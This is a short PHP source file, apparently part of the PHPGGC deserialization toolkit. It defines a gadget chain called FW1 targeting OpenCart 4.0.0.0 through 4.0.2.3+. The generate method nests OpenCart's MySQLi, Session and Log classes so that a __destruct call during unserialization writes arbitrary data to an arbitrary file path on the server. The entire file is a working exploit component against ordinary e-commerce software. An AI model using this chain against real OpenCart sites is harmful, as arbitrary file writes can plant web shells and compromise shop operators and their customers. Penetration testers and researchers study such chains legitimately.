<?php

namespace GadgetChain\OpenCart;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '4.0.0.0 <= 4.0.2.3+';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \Opencart\System\Library\DB\MySQLi(
            new \Opencart\System\Library\Session(
                new \Opencart\System\Library\Log($path),
                $data
            )
        );
    }
}